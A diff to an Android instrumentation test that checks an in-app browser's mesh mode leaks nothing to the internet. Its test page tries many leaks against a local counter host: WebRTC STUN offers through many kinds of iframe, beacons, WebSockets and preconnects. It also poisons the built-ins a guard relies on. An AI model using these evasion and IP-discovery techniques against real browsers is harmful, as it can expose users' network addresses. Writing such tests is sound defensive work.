@@ -54,7 +54,7 @@ class InAppBrowserMeshLeakTest {
         <style>body{background:url(http://$leak/bg.png)} @font-face{font-family:f;src:url(http://$leak/f.woff)} p{font-family:f}</style>
         </head><body><p>mesh</p>
         <img src="http://$leak/img.png"><img src="http://$other.fips/other.png"><img src="/own.png">
-        <iframe src="http://$leak/frame"></iframe>
+        <iframe src="http://$leak/frame"></iframe><iframe id="blank"></iframe>
         <video src="/clip.mp4" preload="auto" muted></video><video src="http://$leak/clip.mp4" preload="auto" muted></video>
         <form id="f" method="post" action="http://$leak/post"><input name="a" value="1"></form>
         <script>
@@ -64,10 +64,52 @@ class InAppBrowserMeshLeakTest {
         try { new WebSocket('ws://$leak/ws'); } catch (e) {}
         try { new WebSocket('ws://$npub.fips/ws'); r.push('fipsws-made'); } catch (e) { r.push('fipsws-refused'); }
         r.push('rtc-' + typeof RTCPeerConnection);
-        try { new RTCPeerConnection({ iceServers: [{ urls: 'stun:$leak' }] }).createDataChannel('x'); } catch (e) {}
+        try { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:$leak' }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}
         try { navigator.sendBeacon('http://$leak/beacon', 'x'); } catch (e) {}
         try { new EventSource('http://$leak/es'); } catch (e) {}
         try { var l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://$leak/'; document.head.appendChild(l); } catch (e) {}
+        // Frames the page makes reach their window without contentWindow: each must have no WebRTC either.
+        var stun = { iceServers: [{ urls: 'stun:$leak' }] };
+        // An offer starts ICE gathering: the STUN request a site would use to learn this device's IP.
+        function offer(pc, tag) { pc.createDataChannel(tag); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {}); }
+        function rtc(tag, w) {
+          try { r.push(tag + '-' + typeof w.RTCPeerConnection); if (w.RTCPeerConnection) offer(new w.RTCPeerConnection(stun), tag); }
+          catch (e) { r.push(tag + '-err'); }
+        }
+        try {
+          var f = document.createElement('iframe'); document.body.appendChild(f);
+          rtc('frames', frames[frames.length - 1]);
+          rtc('index', window[window.length - 1]);
+          rtc('doc', f.contentDocument.defaultView);
+          var g = document.createElement('iframe'); document.body.appendChild(g);
+          g.contentDocument.open(); g.contentDocument.write('<p>w</p>'); g.contentDocument.close();
+          rtc('written', g.contentDocument.defaultView);
+          rtc('static', document.getElementById('blank').contentDocument.defaultView);
+          var d = document.createElement('div'); document.body.appendChild(d); d.innerHTML = '<iframe></iframe>';
+          rtc('html', window[window.length - 1]);
+          var host = document.createElement('div'); document.body.appendChild(host);
+          host.attachShadow({ mode: 'closed' }).appendChild(document.createElement('iframe'));
+          rtc('shadow', window[window.length - 1]);
+          // A page that breaks the tools the guard would use, then makes a frame.
+          Object.defineProperty = function () {}; Event.prototype.stopImmediatePropagation = function () {};
+          String.prototype.toLowerCase = function () { return 'web'; };
+          var p = document.createElement('iframe'); document.body.appendChild(p);
+          rtc('poisoned', window[window.length - 1]);
+        } catch (e) { r.push('frames-err:' + e); }
+        // Frames whose own script runs: srcdoc (same origin) and sandboxed srcdoc (opaque origin, no top access).
+        window.addEventListener('message', function (e) { if (typeof e.data === 'string' && e.data.indexOf('in-') === 0) r.push(e.data); });
+        var inner = "<script>var s='undefined';try{s=typeof RTCPeerConnection;if(window.RTCPeerConnection){var p=new RTCPeerConnection({iceServers:[{urls:'stun:$leak'}]});p.createDataChannel('i');p.createOffer().then(function(o){return p.setLocalDescription(o)})}}catch(e){s='err'}parent.postMessage('in-'+name+'-'+s,'*')<\/script>";
+        [['srcdoc', ''], ['sandboxed', 'allow-scripts']].forEach(function (k) {
+          var i = document.createElement('iframe'); i.name = k[0]; if (k[1]) i.setAttribute('sandbox', k[1]); i.srcdoc = inner; document.body.appendChild(i);
+        });
+        try {
+          var j = document.createElement('iframe'); j.name = 'js'; j.src = 'javascript:"' + inner.replace(/"/g, '&quot;') + '"'; document.body.appendChild(j);
+        } catch (e) { r.push('in-js-err'); }
+        // A frame sent to about:blank again after it was made: a new document in the same window.
+        try {
+          var n = document.createElement('iframe'); document.body.appendChild(n);
+          n.onload = function () { rtc('renav', n.contentWindow); }; n.src = 'about:blank';
+        } catch (e) { r.push('renav-err'); }
         setTimeout(function () { document.title = 'done:' + r.join(','); }, 1500);
         </script></body></html>
     """.trimIndent()
@@ -152,10 +194,52 @@ class InAppBrowserMeshLeakTest {
 
         val t = title()
         assertTrue("WebRTC is gone on a mesh page ($t)", t.contains("rtc-undefined"))
+        for (frame in listOf("frames", "index", "doc", "written", "static", "html", "shadow", "poisoned", "renav", "in-srcdoc", "in-sandboxed", "in-js")) {
+            assertTrue("WebRTC is gone in the page's $frame frame ($t), leaks: $leaks", t.contains("$frame-undefined"))
+        }
         assertTrue("a websocket to a .fips host is refused before DNS ($t)", t.contains("fipsws-refused"))
         assertTrue("the page's own stylesheet came over the mesh: $doorPaths", "/style.css" in doorPaths)
         assertTrue("another npub's image was not read for this page: $doorPaths", doorPaths.none { it.contains("other") })
         assertEquals("nothing reached the internet host: $leaks", emptyList<String>(), leaks.toList())
+
+        // Positive control: the same host as a web page the reader asked for does connect.
+        onMain { model.open("http://$leak/control") }
+        assertTrue("the counter sees a real connection", waitForLeak())
+    }
+
+    @Test fun aSecondBrowserCannotTurnTheMeshProxyOffUnderAMeshPage() {
+        onMain { model.open("http://$npub.fips/") }
+        assertTrue("the mesh page ran (title: ${title()})", waitFor(20_000) { model.title.startsWith("done:") })
+        Thread.sleep(1500)
+        assertEquals("the mesh page itself reached nothing: $leaks", emptyList<String>(), leaks.toList())
+
+        // A second browser over the first, on a web page, then closed: the first is on screen again.
+        val web = MockWebServer().apply {
+            dispatcher = object : Dispatcher() {
+                override fun dispatch(request: RecordedRequest) =
+                    MockResponse().setHeader("Content-Type", "text/html").setBody("<title>web-page</title><p>web</p>")
+            }
+            start()
+        }
+        lateinit var second: InAppBrowserModel
+        onMain {
+            model.pause()
+            second = InAppBrowserModel(instrumentation.targetContext) { error("no mesh in the second browser") }
+            second.resume()
+            second.open("http://127.0.0.1:${web.port}/")
+        }
+        assertTrue("the second browser loaded its web page", waitFor(10_000) { second.title == "web-page" })
+        onMain { second.close(); model.resume() }
+        web.shutdown()
+
+        // The mesh page adds a preconnect after the reader came back.
+        onMain {
+            model.webView.evaluateJavascript(
+                "var l=document.createElement('link');l.rel='preconnect';l.href='http://$leak/';document.head.appendChild(l);" +
+                    "var i=new Image();i.src='http://$leak/back.png'", null)
+        }
+        Thread.sleep(3000)
+        assertEquals("nothing reached the internet host after the second browser: $leaks", emptyList<String>(), leaks.toList())
 
         // Positive control: the same host as a web page the reader asked for does connect.
         onMain { model.open("http://$leak/control") }
